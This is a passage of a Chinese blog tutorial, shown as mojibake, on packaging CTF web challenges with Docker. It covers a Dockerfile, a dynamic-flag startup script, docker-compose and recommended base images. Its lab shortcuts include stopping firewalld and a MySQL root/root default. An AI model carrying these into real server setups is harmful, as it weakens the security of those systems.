id="è¿›å…¥é€€å‡ºå®¹å™¨ç¯‡">è¿›å…¥é€€å‡ºå®¹å™¨ç¯‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it å®¹å™¨id  /bin/bash  # è¿›å…¥å®¹å™¨çš„bashç•Œé¢</span><br><span class="line">docker attach å®¹å™¨id# è¿›å…¥å®¹å™¨å†…éƒ¨</span><br><span class="line">exit                                    # è¿›å…¥dockerå†…éƒ¨åé€€å‡ºå®¹å™¨</span><br></pre></td></tr></table></figure><p>ä¹‹å‰çš„<code>docker exec -it ID /bin/bash</code>å…¶å®å¹¶æ²¡æœ‰è¿›å…¥è¿™ä¸ªå®¹å™¨ï¼Œè€Œæ˜¯å¼¹äº†ä¸€ä¸ª<code>bash</code>å‡ºæ¥è®©æˆ‘ä»¬èƒ½åœ¨å®¹å™¨é‡Œæ“ä½œï¼Œè€Œ<code>attach</code>æ‰ç®—è¿›å…¥äº†å®¹å™¨å†…éƒ¨ã€‚</p><h3 id="æŸ¥çœ‹ç›¸å…³é…ç½®">æŸ¥çœ‹ç›¸å…³é…ç½®</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker port å®¹å™¨id   # æŸ¥çœ‹å®¹å™¨æ˜ å°„ç«¯å£</span><br><span class="line">netstat -tlnp# æŸ¥çœ‹ä¸»æœºå¼€æ”¾ç«¯å£</span><br><span class="line">systemctl status firewalld# æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</span><br><span class="line">systemctl stop firewalld# æš‚æ—¶å…³é—­é˜²ç«å¢™</span><br></pre></td></tr></table></figure><h3 id="å¯¼å‡ºå¯¼å…¥ç¯‡">å¯¼å‡ºå¯¼å…¥ç¯‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker export å®¹å™¨id &gt; ctf.tar# å¯¼å‡ºä¸ºtaræ–‡ä»¶</span><br><span class="line">docker save é•œåƒname  &gt; ./ctf.tar# å°†â†’æŒ‡å®šé•œåƒåâ†ä¿å­˜æˆ tar å½’æ¡£æ–‡ä»¶</span><br><span class="line">cat ctf.tar | docker import - ctf               # å¯ä»¥è¿™æ ·å¯¼å…¥</span><br><span class="line">docker load&lt;ctf.tar        # è½½å…¥é•œåƒåŒ…</span><br></pre></td></tr></table></figure><div class="note primary no-icon flat"><p>å°Tipï¼š</p><ul><li><p>docker save ä¿å­˜çš„æ˜¯é•œåƒï¼ˆimageï¼‰ï¼Œdocker export ä¿å­˜çš„æ˜¯å®¹å™¨ï¼ˆcontainerï¼‰ï¼›</p></li><li><p>docker load ç”¨æ¥è½½å…¥é•œåƒåŒ…ï¼Œdocker import ç”¨æ¥è½½å…¥å®¹å™¨åŒ…ï¼Œä½†ä¸¤è€…éƒ½ä¼šæ¢å¤ä¸ºé•œåƒï¼›</p></li><li><p>docker load ä¸èƒ½å¯¹è½½å…¥çš„é•œåƒé‡å‘½åï¼Œè€Œ docker import å¯ä»¥ä¸ºé•œåƒæŒ‡å®šæ–°åç§°ã€‚</p></li></ul></div><p>è‹¥å¯¼å…¥æ—¶å‡ºç°è¿™ä¸ªé—®é¢˜<code>open /var/lib/docker/tmp/docker-import-970689518/bin/json: no such file or directory</code>ï¼Œè¯´æ˜è¿™ä¸ªtaråŒ…ç¼ºå°‘dockeræ‰€éœ€è¦çš„ä¸€äº›jsonæ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥å¯¼å…¥ã€‚</p><h2 id="äºŒã€æ–‡ä»¶ç›®å½•æ€»è§ˆ">äºŒã€æ–‡ä»¶ç›®å½•æ€»è§ˆ</h2><p>ç›®å½•æ–‡ä»¶å¤¹å¦‚ä¸‹:<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220404/%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%A4%B9.72tihoys43c0.jpg" alt="æ–‡ä»¶ç›®å½•æ€»è§ˆ"></p><h2 id="ä¸‰ã€Dockerfile">ä¸‰ã€Dockerfile</h2><p>Dockerfile æ˜¯ä¸€ä¸ªç”¨æ¥æ„å»ºé•œåƒçš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ–‡æœ¬å†…å®¹åŒ…å«äº†ä¸€æ¡æ¡æ„å»ºé•œåƒæ‰€éœ€çš„æŒ‡ä»¤å’Œè¯´æ˜ã€‚</p><p>ğŸ‘‰ <a href="https://www.runoob.com/docker/docker-dockerfile.html">Dockerfileç›¸å…³æŒ‡ä»¤æ•™ç¨‹</a> ğŸ‘ˆ</p><p><strong>æ–‡ä»¶åï¼šDockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Author=<span class="string">&quot;Ztop&quot;</span></span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Blog=<span class="string">&quot;https://www.zeker.top&quot;</span></span></span><br><span class="line"><span class="keyword">ENV</span> REFRESHED_AT <span class="number">2022</span>-<span class="number">03</span>-<span class="number">01</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ˆå†™ ä¿®æ”¹æº/æ›´æ–° ã€å¦‚æœå¿…é¡»çš„è¯ã€‘</span></span><br><span class="line"><span class="comment"># æ›¿æ¢æºï¼ˆè¿™é‡Œå¯ç”¨sedæˆ–è€…ç›´æ¥COPYä¸€ä¸ªå®Œæ•´çš„sources.listæ¥æ›¿æ¢ï¼‰</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="bash">    sed -i s@/security.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get update -y</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#é˜²æ­¢Apacheå®‰è£…è¿‡ç¨‹ä¸­åœ°åŒºçš„è®¾ç½®å‡ºé”™</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"><span class="comment">#å®‰è£…apache2</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install apache2 -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å®‰è£…php</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install php -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install libapache2-mod-php -y  --fix-missing</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install php7.0-mysql -y</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># #å®‰è£…mysql</span></span><br><span class="line"><span class="comment"># RUN apt-get install mysql-server -y</span></span><br><span class="line"><span class="comment"># RUN apt-get install mysql-client -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç„¶åæ‰æ˜¯å¤åˆ¶æ–‡ä»¶ï¼Œä¸æ¨èæŒ‚è½½å·</span></span><br><span class="line"><span class="comment"># ADDä¼šè‡ªåŠ¨è§£å‹å‹ç¼©åŒ…ï¼Œè€ŒCOPYä¸ä¼š</span></span><br><span class="line"><span class="comment"># ADD html.tgz /var/www</span></span><br><span class="line"><span class="comment">#å°†é¢˜ç›®æºç æ”¾è¿›å»</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /var/www/html/index.html</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./src/ /var/www/html/   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /var/www/html/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯åŠ¨è„šæœ¬</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./run.sh /root/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  chmod +x /root/run.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;/root/run.sh&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="comment">#ENV FLAG=flag&#123;test_flag&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æš´éœ²ç«¯å£</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>åœ¨ Dockerfile æ–‡ä»¶çš„å­˜æ”¾ç›®å½•ä¸‹ï¼Œæ‰§è¡Œæ„å»ºåŠ¨ä½œã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .            # dockerfileç›®å½•ä¸‹è¾“å…¥æ„å»ºå‘½ä»¤ï¼Œç”¨æ¥æ„å»ºåŸºäºubuntu:16.04çš„è‡ªå®šä¹‰é•œåƒã€‚</span><br><span class="line"></span><br><span class="line">docker run -d -p 5555:80 -e FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125; é•œåƒid  # æ·»åŠ ç³»ç»Ÿuuidä½œä¸ºåŠ¨æ€flagå­—æ®µ</span><br><span class="line"></span><br><span class="line">docker ps                           # æŸ¥çœ‹æ˜¯å¦è¿è¡Œ</span><br><span class="line"></span><br><span class="line">docker exec -it å®¹å™¨id /bin/bash     # è¿›å…¥å®¹å™¨</span><br><span class="line">exit                                 # åœ¨å®¹å™¨å†…é€€å‡º</span><br></pre></td></tr></table></figure><h2 id="å››ã€Shellæ–‡ä»¶">å››ã€Shellæ–‡ä»¶</h2><p><strong>æ–‡ä»¶åï¼š<a href="http://run.sh">run.sh</a></strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰åŠ¨æ€flagå­—æ®µ</span></span><br><span class="line">uuid=$(cat /proc/sys/kernel/random/uuid)</span><br><span class="line">FLAG=<span class="string">&quot;flag&#123;<span class="variable">$uuid</span>&#125;&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/flag_is_here/<span class="variable">$FLAG</span>/&quot;</span> /var/www/html/flag</span><br><span class="line"><span class="comment"># sed -i &quot;s/flag_is_here/$FLAG/&quot; /var/www/html/flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦†ç›–æ‰ç¯å¢ƒå˜é‡ï¼Œé˜²æ­¢éé¢„æœŸ</span></span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯åŠ¨apache</span></span><br><span class="line">service apache2 restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># # never exitï¼Œæ­¤å¤„æ˜¯ä¸ºäº†è¿è¡Œå®Œä¸Šæ¡åº”ç”¨æœåŠ¡åï¼Œæœ‰å¯¹åº”çš„å‰å°è¿›ç¨‹</span></span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure><p>é™„ä¸Š<code>flag</code>æ–‡ä»¶ä¸­çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_is_here</span><br></pre></td></tr></table></figure><div class="note info no-icon flat"><p><code>sed -i</code> å°±æ˜¯ç›´æ¥å¯¹æ–‡æœ¬æ–‡ä»¶è¿›è¡Œæ“ä½œçš„<br>æ›¿æ¢æ–‡ä»¶ä¸­çš„åŸå­—ç¬¦ä¸²</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/åŸå­—ç¬¦ä¸²/æ–°å­—ç¬¦ä¸²/&#x27; /home/1.txt# æ›¿æ¢æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹</span><br><span class="line"></span><br><span class="line">sed -i &#x27;s/åŸå­—ç¬¦ä¸²/æ–°å­—ç¬¦ä¸²/g&#x27; /home/1.txt# æ›¿æ¢æ¯ä¸€è¡Œçš„æ‰€æœ‰åŒ¹é…é¡¹</span><br></pre></td></tr></table></figure></div><h2 id="äº”ã€Docker-compose">äº”ã€Docker-compose</h2><p><code>Docker-compose</code> æ˜¯ä¸€ä¸ªç”¨æ¥æŠŠ <code>docker</code> è‡ªåŠ¨åŒ–çš„ä¸œè¥¿ã€‚<br>æœ‰äº† <code>docker-compose</code> ä½ å¯ä»¥æŠŠæ‰€æœ‰ç¹æ‚é‡å¤çš„ docker æ“ä½œ<code>å…¨éƒ½ä¸€æ¡å‘½ä»¤</code>ï¼Œè‡ªåŠ¨åŒ–çš„å®Œæˆã€‚</p><p><code>Compose</code> æ˜¯ç”¨äºå®šä¹‰å’Œè¿è¡Œå¤šå®¹å™¨ Docker åº”ç”¨ç¨‹åºçš„å·¥å…·ã€‚<br>é€šè¿‡ <code>Compose</code>ï¼Œä½ å¯ä»¥ä½¿ç”¨ <code>YML</code> æ–‡ä»¶æ¥é…ç½®åº”ç”¨ç¨‹åºéœ€è¦çš„æ‰€æœ‰æœåŠ¡ã€‚<br>ç„¶åï¼Œä½¿ç”¨ä¸€ä¸ªå‘½ä»¤ï¼Œå°±å¯ä»¥ä» <code>YML</code> æ–‡ä»¶é…ç½®ä¸­åˆ›å»ºå¹¶å¯åŠ¨æ‰€æœ‰æœåŠ¡ã€‚</p><p><strong>æ–‡ä»¶åï¼šdocker-compose.yml</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŒ‡å®šè¯¥æ–‡ä»¶ç‰ˆæœ¬</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="comment"># æŠŠæ¯ä¸ªå­ç›®å½•è§†ä¸ºä¸€ä¸ªé•œåƒï¼Œå¼€å§‹æ„å»º</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web1:</span></span><br><span class="line">    <span class="comment"># æ­¤å¤„ä»…å…è®¸ image, build, portsï¼Œç¦æ­¢å…¶ä»–å­—æ®µå‡ºç°ï¼Œå¦‚æœæœ‰ volumeï¼Œcmd ç­‰è®¾ç½®éœ€æ±‚ï¼Œè¯·åœ¨ Dockerfile é‡Œè¿›è¡Œæ–‡ä»¶æ‹·è´æˆ–è€…ç”³æ˜ã€‚</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">ctf/test1</span>        <span class="comment">#é•œåƒåå­—</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./web/</span>           <span class="comment">#buildçš„ä½ç½®ï¼Œdockerä¼šå»web1ä¸­çš„dockerfileå¼€å§‹æ­å»º</span></span><br><span class="line">    <span class="comment"># restart: always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;5555:80&quot;</span>           <span class="comment">#è®¾ç½®æ˜ å°„çš„æ–­å£</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;this_is_test_flag&#125;</span>                      <span class="comment"># è¿™é‡Œå®šä¹‰äº†flag,ä½†æ˜¯ä¸ä¼šè¦†ç›–shé‡Œçš„$FLAG</span></span><br><span class="line">    <span class="comment">#   - FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125;  # è·å–å®¹å™¨çš„uuidä½œä¸ºflag ä¼šæŠ¥é”™</span></span><br></pre></td></tr></table></figure><ul><li>version<br>è¯´æ˜äº†ymlæ–‡ä»¶æŒ‡æ˜çš„ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬æˆ‘ä»¬ä½¿ç”¨<code>2ï¼Œ3</code>è¿™ä¸¤ä¸ªç‰ˆæœ¬ã€‚</li><li>services<br>ymlæ–‡ä»¶çš„ä¸»ä½“ï¼Œå®šä¹‰äº†æœåŠ¡äº†é…ç½®ã€‚é‡Œé¢çš„<code>web</code>æ ‡ç­¾æ˜¯æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ã€‚<br>buildè¡¨æ˜äº†ä»¥dockerfileç±»å‹å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œåé¢è·Ÿçš„æ˜¯dockerfileçš„è·¯å¾„ï¼Œæ”¯æŒç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„ï¼Œåœ¨è¿™ä¸ªymlæ–‡ä»¶é‡Œé¢ï¼Œè¡¨æ˜dockerfileä¸ymlå¤„åœ¨åŒä¸ªç›®å½•ä¸‹ã€‚</li></ul><div class="note primary no-icon flat"><p>å®¹å™¨çš„å¯åŠ¨å¯ä»¥æ ¹æ®å·²æœ‰çš„é•œåƒï¼Œå¦‚æœå®šä¹‰äº†<code>image</code>è¿™ä¸ªæ ‡ç­¾ï¼Œå°±ä¼šä»æœ¬åœ°æœå¯»ç›¸å…³é•œåƒæ„å»ºå®¹å™¨ï¼Œå¦‚æœæœ¬åœ°æ‰¾ä¸åˆ°ç›¸å…³çš„é•œåƒï¼Œå°±ä¼šä»ç½‘ä¸Šæ•°æ®åº“æœå¯»ç›¸å…³çš„é•œåƒã€‚</p><p>ä½†å¤§å®¶å¯èƒ½ä¼šäº§ç”Ÿç–‘é—®äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å®šä¹‰äº†<code>build</code>è¿˜æœ‰<code>image</code>ä¸¤ä¸ªä¸åŒçš„æ ‡ç­¾æ¥æ„å»ºé•œåƒï¼Œé‚£ä¹ˆå®¹å™¨åˆ°åº•è¦ç”¨<code>build</code>è¿˜æ˜¯<code>image</code>æ¥æ„å»ºå‘¢ï¼Œè¿™ç§æƒ…å†µä¸‹å°†æŒ‰ç…§<code>dockerfile</code>çš„æ–¹å¼æ¥æ„å»ºé•œåƒï¼Œå¹¶ä¸”æŠŠé•œåƒçš„åç§°å®šä¹‰ä¸º<code>image</code>æ ‡ç­¾é‡Œé¢çš„åç§°ã€‚</p></div><ul><li>environment<br>æ„å»ºäº†ç›¸å…³çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æ˜¯å®šä¹‰äº†ä¸€ä¸ª<code>FLAG</code>ç¯å¢ƒå˜é‡ï¼Œå¹¶ä¸”å€¼ä¸º<code>flag&#123;this_is_test_flag&#125;</code><br>å®šä¹‰ä¹‹å‰è¦åˆ é™¤<code>shellæ–‡ä»¶</code>ä¸­çš„å®šä¹‰å˜é‡ï¼Œå¦åˆ™ä¼šæŠ¥é”™</li><li>ports<br>å®šä¹‰äº†æ˜ å°„çš„ç«¯å£ï¼Œ<code>5555:80</code>è¡¨ç¤ºæ˜ å°„åˆ°æœ¬æœºçš„<code>5555</code>ç«¯å£ï¼Œåé¢çš„<code>80</code>ç«¯å£åˆ™è¦ä¸Dockerfileæ–‡ä»¶ä¸­<code>EXPOSE</code>çš„ç«¯å£ä¿æŒä¸€è‡´ã€‚</li></ul><p>ç¼–å†™å®Œæˆï¼Œç›´æ¥è¿è¡Œä¸‹é¢ç¬¬ä¸€æ¡composeå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up  -d   # åˆ›å»ºå¹¶å¯åŠ¨æ‰€æœ‰æœåŠ¡ï¼ˆå¸¸ç”¨ï¼‰</span><br><span class="line">docker-compose build    # å®¹å™¨é•œåƒåˆ›å»º(æ²¡å¯åŠ¨)</span><br><span class="line">docker-compose stop     # å…³é—­æ‰€æœ‰æœåŠ¡</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è®¿é—®ä¸»æœºçš„5555ç«¯å£ï¼Œå³<code>http://your-ip:5555</code>ï¼Œå³å¯çœ‹åˆ°é¢˜ç›®ğŸ‘‡<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220404/%E6%B5%8F%E8%A7%88%E5%99%A8%E9%A2%98%E7%9B%AE%E6%9F%A5%E7%9C%8B.6t8w0yxpc140.jpg" alt="æµè§ˆå™¨é¢˜ç›®æŸ¥çœ‹"><br>æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å®ç°æœ¬åœ°åŠ¨æ€flagğŸ‘‡<br><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220404/%E8%8E%B7%E5%8F%96%E5%8A%A8%E6%80%81flag.4a83tfhoi9q0.jpg" alt="è·å–åŠ¨æ€flag"></p><h2 id="å…­ã€å¥½ç”¨çš„å‡ºé¢˜é•œåƒ">å…­ã€å¥½ç”¨çš„å‡ºé¢˜é•œåƒ</h2><p>ä»ä¸Šé¢çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°å¯¹äºä¸€é“é¢˜ç›®æ¥è¯´ï¼Œé™¤äº†æºç ä»¥å¤–ï¼Œæœ€å¤§çš„ä¸æ–¹ä¾¿ä¹‹å¤„å°±æ˜¯è¿˜è¦æœ‰ç›¸å…³çš„ä¸€äº›æ–‡ä»¶é…ç½®ã€‚<br>åœ¨è¿™é‡Œæˆ‘æ¨è<code>virink</code>å†™çš„<a href="https://github.com/CTFTraining/base_image_nginx_mysql_php_56">base_image_nginx_mysql_php_56</a>æ¥è¾…åŠ©æˆ‘ä»¬å¿«é€Ÿå‡ºé¢˜ã€‚<br>è¿™ä¸ªé•œåƒä¸»è¦å¥½åœ¨ä¸éœ€è¦æˆ‘ä»¬å»é…ç½®å…¶ä»–çš„<code>nginx</code>è®¾ç½®ï¼Œè€Œä¸”è¿˜æ”¯æŒè‡ªåŠ¨å¯¼å…¥<code>db.sql</code>æ–‡ä»¶,æ”¯æŒè‡ªåŠ¨æ‰§è¡Œ<code>flag.sh</code>æ–‡ä»¶ã€‚</p><p>è¿™é‡Œä»¥ä¸€é“é¢˜ä¸ºä¾‹ï¼Œé¢˜ç›®ä¸­ä¸»è¦æ˜¯éœ€è¦é…ç½®æ•°æ®åº“.<br>æˆ‘ä»¬åªéœ€è¦<code>srcæ–‡ä»¶å¤¹</code>ä¸­æ”¾å…¥<code>æºç </code>ã€<code>flag.sh</code>ã€<code>db.sql</code>(<strong>æ–‡ä»¶åä¸èƒ½å˜</strong>)ï¼Œç°åœ¨æˆ‘ä»¬dockerfileåªéœ€è¦è¿™ä¹ˆå†™:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_mysql_php_56</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mv /var/www/html/flag.sh / \</span></span><br><span class="line"><span class="bash">    &amp;&amp; chmod +x /flag.sh</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé•œåƒå°±ä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬é…ç½®ç›¸å…³çš„<code>nginx</code>æ–‡ä»¶ï¼ŒåŒæ—¶è‡ªåŠ¨å¯¼å…¥è¦æ‰§è¡Œçš„<code>db.sql</code>æ–‡ä»¶æ¥é…ç½®æ•°æ®åº“(é»˜è®¤ç”¨æˆ·ä¸ºroot,å¯†ç ä¹Ÿä¸ºroot,æ‰§è¡Œådb.sqlä¼šè¢«åˆ æ‰)<br>åŒæ—¶é•œåƒè¿˜ä¼šè‡ªåŠ¨æ‰§è¡Œ<code>flash.sh</code>æ¥ä»ç¯å¢ƒå˜é‡ä¸­è¯»å–flagå†™å…¥åˆ°<code>flag.php</code>ä¸­(éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>flag.shå¿…éœ€åœ¨æ ¹ç›®å½•ä¸‹</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦æ‰§è¡Œ<code>mv /var/www/html/flag.sh /</code>è¿™ä¸€æ­¥çš„åŸå› æ‰€åœ¨)ã€‚<br>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªé•œåƒæå¤§çš„æ–¹ä¾¿äº†æˆ‘ä»¬å¯¹Dockerfileçš„ç¼–å†™ï¼ŒæŠŠDockerfileç®€åŒ–åˆ°åªéœ€è¦ä¸¤ä¸‰å¥è¯å°±èƒ½æå®šã€‚</p><p>å¦‚æœæ˜¯è¦åœ¨<code>php7</code>çš„ç¯å¢ƒä¸‹å‡ºé¢˜,å¯ä»¥é‡‡ç”¨<a href="https://github.com/CTFTraining/base_image_nginx_mysql_php_73">base_image_nginx_mysql_php_73</a></p><p>æ›´å¤š<code>dockeræ¨¡æ¿</code>å¯å‰å¾€é“¾æ¥ ğŸ‘‰ <a href="https://github.com/DASCTF-Test">https://github.com/DASCTF-Test</a> ğŸ‘ˆ ï¼Œè¿™ä¸ªdockeræ¨¡æ¿ä¸­å›Šæ‹¬äº†å¾ˆå¤šæ¯”èµ›é¢˜ç›®éœ€è¦çš„ç¯å¢ƒï¼Œwebæ–¹é¢æ‹¥æœ‰å¤šä¸ªç‰ˆæœ¬php mysqlçš„ç¯å¢ƒï¼Œæ‹¥æœ‰javaä¸pythonç­‰é¢˜ç›®ç¯å¢ƒï¼Œpwnä¹Ÿæ‹¥æœ‰å¤šä¸ªç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸é¢˜ç›®ç¯å¢ƒã€‚</p><p>å¦‚æœè¿˜æƒ³é€šè¿‡æ›´å¤šçš„ç¯å¢ƒå­¦ä¹ å¦‚ä½•å‡ºé¢˜ï¼Œå¯ä»¥åœ¨è¿™ä¸ª ğŸ‘‰ <a href="https://github.com/CTFTraining/CTFTraining">é¡¹ç›®</a> ğŸ‘ˆ ä¸­æŸ¥çœ‹æ›´å¤šçš„é¢˜ç›®ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒæ­å»º </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯å¢ƒæ­å»º </tag>
            
            <tag> Docker </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ¬åœ°éƒ¨ç½²å‰åç«¯é¡¹ç›®æ•™ç¨‹</title>
      <link href="/posts/ae96b769/"/>
      <url>/posts/ae96b769/</url>
      
